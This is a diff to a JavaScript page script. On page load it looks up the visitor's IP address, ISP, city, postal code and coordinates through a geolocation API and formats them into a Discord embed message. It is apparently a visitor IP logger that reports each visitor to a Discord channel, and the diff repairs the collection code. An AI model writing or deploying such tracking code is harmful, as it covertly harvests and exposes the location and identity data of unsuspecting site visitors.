@@ -1,11 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
-  fetch('https://ipapi.com/json/?callback=yourCallback')
-    .then(response => response.text())
-    .then(data => {
-      // Extract the JSON data from the response
-      const jsonStr = data.match(/^{.*}$/)[0];
-      const geoData = JSON.parse(jsonStr);
-      
+  fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(geoData => {
       const ipAddress = geoData.ip;
       const currentDateTime = new Date();
       const dateTimeString = currentDateTime.toLocaleString();
@@ -20,7 +16,7 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 function createMessage(ipAddress, dateTimeString, geoData) {
-  const { ip, isp, country_name, region, city, zip, lat, lon } = geoData;
+  const { ip, isp, country_name, region, city, postal, latitude, longitude } = geoData;
 
   const message = {
     embeds: [
@@ -34,9 +30,9 @@ function createMessage(ipAddress, dateTimeString, geoData) {
           Country: ${country_name}
           Region: ${region}
           City: ${city}
-          Postal Code: ${zip}
-          Latitude: ${lat}
-          Longitude: ${lon}
+          Postal Code: ${postal}
+          Latitude: ${latitude}
+          Longitude: ${longitude}
         `,
         thumbnail: {
           url: 'https://cdn.discordapp.com/attachments/1008763573029306519/1112393554585718867/1075892497257091092.png' // Customize the URL of the preview image
